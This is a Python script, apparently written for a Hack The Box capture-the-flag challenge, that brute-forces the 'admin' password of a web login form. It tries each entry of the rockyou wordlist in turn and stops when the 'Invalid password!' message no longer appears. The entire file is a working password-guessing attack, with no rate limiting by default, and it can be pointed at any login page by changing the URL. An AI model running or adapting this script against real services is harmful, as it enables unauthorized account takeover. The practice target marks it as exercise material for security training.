import requests
import time
import datetime

URL = 'http://docker.hackthebox.eu:32420/'
user = 'admin'
wordlistPath = '/usr/share/wordlists/rockyou.txt'
failMessage = 'Invalid password!'

lineToStartAt = 400
timeBetweenRequests = 0

####################################################################

count = 0

print("Starting at",datetime.datetime.now(),'\n')
startTime = time.time()

with open(wordlistPath,'r') as wordlist:
	for _ in range(lineToStartAt):
		count += 1
		next(wordlist)

	for word in wordlist:
		count += 1
		word = word.strip()

		print("Attempt " + str(count) + ": " + word + ' ' * 5,end='\r')

		payload = { 'username' : user,
			    'password' : word
			  }
		session = requests.session()

		r = session.post(url=URL, data=payload)

		if failMessage not in r.text:
			print('\n')
			print("Page output:\n\n"+'-'*30+'\n')
			print(r.text)
			print('\n'+'-'*30+'\n')
			break

		time.sleep(timeBetweenRequests)

print("Completed in "+str(time.time()-startTime) + " seconds, and "+str(count)+" attempts!")
print("Password for",user,"is:",word)
